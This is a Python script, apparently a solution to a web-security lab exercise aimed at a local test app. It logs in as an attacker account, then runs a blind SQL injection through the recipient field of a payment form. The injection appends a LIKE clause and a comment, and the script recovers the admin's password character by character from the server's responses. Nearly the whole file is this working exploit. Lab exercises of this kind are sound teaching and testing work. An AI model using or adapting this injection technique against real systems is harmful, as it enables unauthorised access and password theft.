from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below
    session_token = None
    for cookie in sess.cookies:
        if cookie.name == 'session':
            session_token = cookie.value

    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "session_token": session_token,
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))

    cracked_password = ''
    found = True
    while(True):
        if found == False:
            break
        found = False
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            injection = f"{username}' AND password LIKE '{cracked_password + char}%' --"
            if submit_pay_form(sess, injection, 0):
                cracked_password += char
                print(f"Found character: {char}")
                found = True
                break

    print(f"Cracked password: {cracked_password}")
    return cracked_password

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
